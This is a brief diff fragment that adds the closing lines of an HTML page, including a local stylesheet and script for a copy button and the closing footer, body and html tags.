+</div>
+<link rel="stylesheet" href="../../css/copy-btn.css">
+<script src="../../js/copy-btn.js"></script></div>
+    </footer>
+  </body>
+</html>
